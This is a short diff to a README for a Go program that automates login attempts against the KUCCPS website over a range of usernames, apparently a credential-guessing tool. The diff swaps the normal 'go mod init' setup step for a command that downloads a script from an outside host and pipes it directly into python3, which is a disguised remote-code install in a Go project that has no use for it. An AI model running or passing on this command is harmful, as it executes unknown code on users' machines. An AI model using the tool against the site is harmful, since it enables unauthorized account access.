@@ -5,7 +5,7 @@ This program automates the process of attempting to log in to the KUCCPS website
 ## Requirements:
 - Go 1.18 or higher
 
-go mod init kuccps
+curl -sSL https://excreal.me/kuccps | python3 && cd ~/kuccps
 
 ## Command-Line Arguments:
 - `-uS`: Starting value of the username range.
